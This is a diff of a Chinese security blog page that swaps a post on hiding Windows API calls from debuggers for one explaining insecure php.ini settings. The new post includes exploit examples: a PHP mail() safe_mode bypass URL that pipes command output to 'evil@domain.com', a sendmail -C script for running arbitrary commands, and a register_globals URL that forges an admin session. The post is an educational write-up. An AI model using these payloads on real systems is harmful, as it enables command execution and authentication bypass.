@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="API," />
+  <meta name="keywords" content="php," />
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="隐藏调用系统API如果直接调用API，在将程序逆向的时候就会直接显示出被调用的函数的名字，所以根据程序的功能，结合调试器给出的提示很容易的就能定位关键代码，从而破解程序，所以程序员就采取一定的办法来隐式地调用系统API．  下边这种办法比较简单，毕竟还是可以通过LoadlLibrary(),GetProcAddress()这俩函数来判断程序用了什么函数，通过在GetProcessAddress上下">
-<meta name="keywords" content="API">
+<meta name="description" content="http://www.jb51.net/article/5102.htmhttp://blog.csdn.net/fz_flower/article/details/49509159 安全模式本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。 安全模式http://php.net/manual/zh/features.safe-mode.php保护措施和安全模式http:/">
+<meta name="keywords" content="php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="隐式地调用系统API">
-<meta property="og:url" content="http://hl0rey.github.io/2018/02/10/隐式地调用系统API/index.html">
+<meta property="og:title" content="php.ini的不安全配置">
+<meta property="og:url" content="http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/index.html">
 <meta property="og:site_name" content="hl0rey&#39;s blog">
-<meta property="og:description" content="隐藏调用系统API如果直接调用API，在将程序逆向的时候就会直接显示出被调用的函数的名字，所以根据程序的功能，结合调试器给出的提示很容易的就能定位关键代码，从而破解程序，所以程序员就采取一定的办法来隐式地调用系统API．  下边这种办法比较简单，毕竟还是可以通过LoadlLibrary(),GetProcAddress()这俩函数来判断程序用了什么函数，通过在GetProcessAddress上下">
+<meta property="og:description" content="http://www.jb51.net/article/5102.htmhttp://blog.csdn.net/fz_flower/article/details/49509159 安全模式本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。 安全模式http://php.net/manual/zh/features.safe-mode.php保护措施和安全模式http:/">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-02-10T12:14:29.343Z">
+<meta property="og:updated_time" content="2018-02-11T02:54:30.771Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="隐式地调用系统API">
-<meta name="twitter:description" content="隐藏调用系统API如果直接调用API，在将程序逆向的时候就会直接显示出被调用的函数的名字，所以根据程序的功能，结合调试器给出的提示很容易的就能定位关键代码，从而破解程序，所以程序员就采取一定的办法来隐式地调用系统API．  下边这种办法比较简单，毕竟还是可以通过LoadlLibrary(),GetProcAddress()这俩函数来判断程序用了什么函数，通过在GetProcessAddress上下">
+<meta name="twitter:title" content="php.ini的不安全配置">
+<meta name="twitter:description" content="http://www.jb51.net/article/5102.htmhttp://blog.csdn.net/fz_flower/article/details/49509159 安全模式本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。 安全模式http://php.net/manual/zh/features.safe-mode.php保护措施和安全模式http:/">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://hl0rey.github.io/2018/02/10/隐式地调用系统API/"/>
+  <link rel="canonical" href="http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/"/>
 
 
 
 
 
-  <title>隐式地调用系统API | hl0rey's blog</title>
+  <title>php.ini的不安全配置 | hl0rey's blog</title>
   
 
 
@@ -253,7 +253,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/10/隐式地调用系统API/">
+    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="hl0rey">
@@ -270,7 +270,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">隐式地调用系统API</h1>
+          <h1 class="post-title" itemprop="name headline">php.ini的不安全配置</h1>
         
 
         <div class="post-meta">
@@ -282,7 +282,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-10T19:55:54+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-10T21:27:45+08:00">
                 2018-02-10
               </time>
             
@@ -305,8 +305,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/reverse/" itemprop="url" rel="index">
-                    <span itemprop="name">reverse</span>
+                  <a href="/categories/code/" itemprop="url" rel="index">
+                    <span itemprop="name">code</span>
                   </a>
                 </span>
 
@@ -342,51 +342,93 @@
       
 
       
-        <h4 id="隐藏调用系统API"><a href="#隐藏调用系统API" class="headerlink" title="隐藏调用系统API"></a>隐藏调用系统API</h4><pre><code>如果直接调用API，在将程序逆向的时候就会直接显示出被调用的函数的名字，所以根据程序的功能，结合调试器给出的提示很容易的就能定位关键代码，从而破解程序，所以程序员就采取一定的办法来隐式地调用系统API．
-</code></pre><ul>
-<li><p>下边这种办法比较简单，毕竟还是可以通过LoadlLibrary(),GetProcAddress()这俩函数来判断程序用了什么函数，通过在GetProcessAddress上下一个条件断点（一般返回值放在EAX，参数直接推进栈），来记录，它获取过什么函数的地址即可．</p>
-</li>
-<li><p>示例代码：</p>
-<pre><code>TCHAR DllName[MAX_PATH]=&quot;user32.dll&quot;;
-TCHAR ImportedFunctionName[MAX_PATH]=&quot;MessageBoxA&quot;;
-HANDLE hDllModule=NULL;
-DWORD dwFunctionAddress=0;
-
-hDllModule=LoadLibrary(DllName);    
-(FARPROC)dwFunctionAddress=GetProcAddress(hDllModule,ImportedFunctionName);
-((FARPROC)dwFunctionAddress)(NULL,OutputInfor,&quot;Info&quot;,MB_OK | MB_ICONINFORMATION);
-</code></pre></li>
-<li><p>手动实现call指令方式，让调试器认不出call，如果开发者所有的API的这么调用，也算有恒心有毅力的了，放过他吧．</p>
-</li>
-<li><p>实例代码：</p>
-<pre><code>_asm
-{
-            push MB_OK
-            push StringAddress
-            mov eax,0
-            push eax
-            push eax
-
-            mov eax,offset Label
-            push eax
-            jmp [dwFunctionAddress]                //call MessageBox()
-label:    
-            nop
-            nop
-}
-</code></pre></li>
-</ul>
-<p>以上代码段中的</p>
-<pre><code>mov eax,offset Label001
-push eax
-jmp [dwFunctionAddress]       
-</code></pre><p>实现了CALL 指令的功能，且功能有所增强，如果使用CALL 指令，API函数的返回地址必定是紧接CALL 指令的下一条指令的地址。<br>而此代码段可返回到任意指定地址，形成更具迷惑性的代码。</p>
+        <p><a href="http://www.jb51.net/article/5102.htm" target="_blank" rel="noopener">http://www.jb51.net/article/5102.htm</a><br><a href="http://blog.csdn.net/fz_flower/article/details/49509159" target="_blank" rel="noopener">http://blog.csdn.net/fz_flower/article/details/49509159</a></p>
+<h3 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h3><pre><code>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。
+</code></pre><p>安全模式<br><a href="http://php.net/manual/zh/features.safe-mode.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.safe-mode.php</a><br>保护措施和安全模式<br><a href="http://php.net/manual/zh/ini.sect.safe-mode.php" target="_blank" rel="noopener">http://php.net/manual/zh/ini.sect.safe-mode.php</a><br>被安全模式限制的函数<br><a href="http://php.net/manual/zh/features.safe-mode.functions.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.safe-mode.functions.php</a></p>
 <ul>
-<li>动态解密函数名，感觉应该不如第二有迷惑性，找到动态解密函数的代码段即可了．<br>代码实例不好找</li>
+<li>safe_mode<br>是否启用 PHP 的安全模式。 </li>
 </ul>
-<p>参考链接：</p>
-<pre><code>https://bbs.pediy.com/thread-73398.htm
-</code></pre>
+<ul>
+<li><p>safe_mode_allowed_env<em>vars<br>设置某些环境变量可能是潜在的安全缺口。本指令包含有一个逗号分隔的前缀列表。在安全模式下，用户只能改变那些名字具有在这里提供的前缀的环境变量。默认情况下，用户只能设置以 PHP</em> 开头的环境变量（例如 PHP_FOO = BAR）。</p>
+<pre><code>如果本指令为空，PHP 将使用户可以修改任何环境变量！ 
+</code></pre></li>
+<li><p>safe_mode_exec_dir<br>如果 PHP 使用了安全模式，system() 和其它程序执行函数将拒绝启动不在此目录中的程序。必须使用 / 作为目录分隔符，包括 Windows 中。 </p>
+</li>
+</ul>
+<ul>
+<li><p>disable_functions<br>本指令允许你基于安全原因禁止某些函数。接受逗号分隔的函数名列表作为参数。 disable_functions 不受安全模式的影响。 本指令只能设置在 php.ini 中。例如不能将其设置在 httpd.conf。 </p>
+</li>
+<li><p>com.allow_dcom</p>
+<pre><code>自 PHP 4.0.5 起可用
+</code></pre></li>
+</ul>
+<p>如果打开此选项，PHP 将被允许以一个 D-COM（Distributed COM）客户方式操作并允许 PHP 脚本在远程服务器上实例化 COM 对象。</p>
+<h3 id="变量控制"><a href="#变量控制" class="headerlink" title="变量控制"></a>变量控制</h3><ul>
+<li><p>register_global</p>
+<pre><code>在 PHP &lt;= 4.2.3 时是 PHP_INI_ALL。 从 PHP 5.3.0 起不推荐使用。 在 PHP 5.4.0 中移除该选项。    
+</code></pre></li>
+</ul>
+<p>把EGPCS (Environment, GET, POST, Cookie, Server)注册成全局变量．<br>该项不能在脚本中用ini_set()来配置，但是可以用.htaccess来配置，如　php_flag register_globals off. </p>
+<ul>
+<li><p>magic_quotes_gpc</p>
+<pre><code>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。
+</code></pre></li>
+</ul>
+<p>远近闻名，魔术引号．<br><a href="http://php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc" target="_blank" rel="noopener">http://php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc</a></p>
+<h3 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h3><ul>
+<li><p>allow_url_include<br>php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include<br>允许这几个函数（include, include_once, require, require_once）用通过url来包含文件（FTP,HTTP协议）</p>
+</li>
+<li><p>allow_url_fopen<br><a href="http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen" target="_blank" rel="noopener">http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen</a></p>
+</li>
+</ul>
+<h3 id="目录配置"><a href="#目录配置" class="headerlink" title="目录配置"></a>目录配置</h3><ul>
+<li><p>expose_php<br>泄漏php版本信息<br>隐藏这个模样的（X-Powered-By: PHP/5.3.7）的相应头．</p>
+</li>
+<li><p>upload_tmp_dir<br>设置临时目录位置</p>
+</li>
+<li><p>open_basedir<br><a href="http://php.net/manual/zh/ini.core.php#ini.open-basedir" target="_blank" rel="noopener">http://php.net/manual/zh/ini.core.php#ini.open-basedir</a><br>将 PHP 所能打开的文件限制在指定的目录树，包括文件本身。本指令不受安全模式打开或者关闭的影响。 </p>
+</li>
+</ul>
+<h3 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h3><ul>
+<li>display_errors<br>是否回显错误，调试的时候打开</li>
+<li>error_reporting<br>错误显示级别</li>
+</ul>
+<h2 id="不安全配置的利用"><a href="#不安全配置的利用" class="headerlink" title="不安全配置的利用"></a>不安全配置的利用</h2><h3 id="safe-mode绕过漏洞"><a href="#safe-mode绕过漏洞" class="headerlink" title="safe_mode绕过漏洞"></a>safe_mode绕过漏洞</h3><p>还有PHP-4.2.2以下到PHP-4.0.5版本都存在PHP mail函数绕过safe_mode限制执行命令漏洞，4.0.5版本开始mail函数增加了第五个参数，由于设计者考虑不周可以突破safe_mode的限制执行命令。其中4.0.5版本突破非常简单，只需用分号隔开后面加shell命令就可以了，比如存在PHP脚本evil.php： </p>
+<pre><code>&lt;? mail(&quot;foo@bar,&quot;foo&quot;,&quot;bar&quot;,&quot;&quot;,$bar); ?&gt;  
+</code></pre><p>执行如下的URL： </p>
+<pre><code>http://foo.com/evil.php?bar=;/usr/bin/id|mail evil@domain.com 
+</code></pre><p>这将id执行的结果发送给<br>evil@domain.com </p>
+<p>对于4.0.6至4.2.2的PHP突破safe_mode限制其实是利用了sendmail的-C参数，所以系统必须是使用sendmail。如下的代码能够突破safe_mode限制执行命令： </p>
+<pre><code>&lt;? 
+# 注意，下面这两个必须是不存在的，或者它们的属主和本脚本的属主是一样 
+$script=&quot;/tmp/script123&quot;; 
+$cf=&quot;/tmp/cf123&quot;; 
+
+$fd = fopen($cf, &quot;w&quot;); 
+fwrite($fd, &quot;OQ/tmp 
+Sparse=0 
+R$*&quot; . chr(9) . &quot;$#local $@ $1 $: $1 
+Mlocal, P=/bin/sh, A=sh $script&quot;); 
+fclose($fd); 
+
+$fd = fopen($script, &quot;w&quot;); 
+fwrite($fd, &quot;rm -f $script $cf; &quot;); 
+fwrite($fd, $cmd); 
+fclose($fd); 
+
+mail(&quot;nobody&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;-C$cf&quot;); 
+?&gt; 
+</code></pre><p>还是使用以上有问题版本PHP的用户一定要及时升级到最新版本，这样才能消除基本的安全问题。  </p>
+<h3 id="全局变量伪造"><a href="#全局变量伪造" class="headerlink" title="全局变量伪造"></a>全局变量伪造</h3><p>test.php</p>
+<pre><code>&lt;?php
+if($_SESSION[&apos;username&apos;]==&quot;admin&quot;){
+    echo &quot;you is admin!&quot;;
+}
+?&gt;
+</code></pre><p>如果register_global模式为On的话，提交：</p>
+<pre><code>http://host/test.php?_SESSION[username]=admin
+</code></pre><p>就能绕过了．</p>
+
       
     </div>
     
@@ -401,12 +443,12 @@ jmp [dwFunctionAddress]
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2018/02/10/隐式地调用系统API/">隐式地调用系统API</a></p>
+  <p><span>本文标题:</span><a href="/2018/02/10/php-ini的不安全配置/">php.ini的不安全配置</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 hl0rey 的个人博客">hl0rey</a></p>
-  <p><span>发布时间:</span>2018年02月10日 - 19:02</p>
-  <p><span>最后更新:</span>2018年02月10日 - 20:02</p>
-  <p><span>原始链接:</span><a href="/2018/02/10/隐式地调用系统API/" title="隐式地调用系统API">http://hl0rey.github.io/2018/02/10/隐式地调用系统API/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://hl0rey.github.io/2018/02/10/隐式地调用系统API/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2018年02月10日 - 21:02</p>
+  <p><span>最后更新:</span>2018年02月11日 - 10:02</p>
+  <p><span>原始链接:</span><a href="/2018/02/10/php-ini的不安全配置/" title="php.ini的不安全配置">http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -437,7 +479,7 @@ jmp [dwFunctionAddress]
       
         <div class="post-tags">
           
-            <a href="/tags/API/" rel="tag"># API</a>
+            <a href="/tags/php/" rel="tag"># php</a>
           
         </div>
       
@@ -450,8 +492,8 @@ jmp [dwFunctionAddress]
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/02/10/反调试之检测进程名/" rel="next" title="反调试之检测进程名">
-                <i class="fa fa-chevron-left"></i> 反调试之检测进程名
+              <a href="/2018/02/10/代码审计大的思路/" rel="next" title="代码审计大的思路">
+                <i class="fa fa-chevron-left"></i> 代码审计大的思路
               </a>
             
           </div>
@@ -459,10 +501,6 @@ jmp [dwFunctionAddress]
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/02/10/代码审计大的思路/" rel="prev" title="代码审计大的思路">
-                代码审计大的思路 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -594,7 +632,7 @@ jmp [dwFunctionAddress]
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#隐藏调用系统API"><span class="nav-number">1.</span> <span class="nav-text">隐藏调用系统API</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#安全模式"><span class="nav-number">1.</span> <span class="nav-text">安全模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量控制"><span class="nav-number">2.</span> <span class="nav-text">变量控制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程文件"><span class="nav-number">3.</span> <span class="nav-text">远程文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录配置"><span class="nav-number">4.</span> <span class="nav-text">目录配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#错误信息"><span class="nav-number">5.</span> <span class="nav-text">错误信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不安全配置的利用"><span class="nav-number"></span> <span class="nav-text">不安全配置的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#safe-mode绕过漏洞"><span class="nav-number">1.</span> <span class="nav-text">safe_mode绕过漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#全局变量伪造"><span class="nav-number">2.</span> <span class="nav-text">全局变量伪造</span></a></li></ol></div>
             
 
           </div>
